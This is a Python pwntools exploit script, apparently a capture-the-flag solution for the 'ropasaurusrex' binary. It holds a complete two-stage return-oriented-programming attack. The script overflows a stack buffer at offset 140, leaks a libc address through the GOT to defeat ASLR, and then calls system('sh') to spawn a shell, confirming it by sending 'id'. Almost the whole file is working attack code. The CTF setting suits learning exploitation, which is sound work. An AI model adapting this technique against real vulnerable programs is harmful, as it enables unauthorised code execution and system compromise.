#!/usr/bin/env python2
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./ropasaurusrex
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./ropasaurusrex')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
break *0x{exe.entry:x}
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    No RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x8048000)

libc = ELF(next(path for path in exe.libs if "libc" in path))
io = start()

rop1 = ROP(exe)
rop1.write(1,exe.got.read,4)
rop1.call(0x080483f4)

stage1 = fit({140:rop1.chain()})
io.send(stage1)

libc_read = u32(io.recv(4))
libc.address = libc_read - libc.sym.read
log.info("libc_read found at {:x}".format(libc_read))
log.info("libc calculated at {:x}".format(libc.address))

rop2 = ROP([exe,libc])
rop2.system(next(libc.search('sh\x00')))

stage2 = fit({140:rop2.chain()})
io.send(stage2)

io.sendline('id')
log.success(io.recvline())



# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)
# io.interactive()
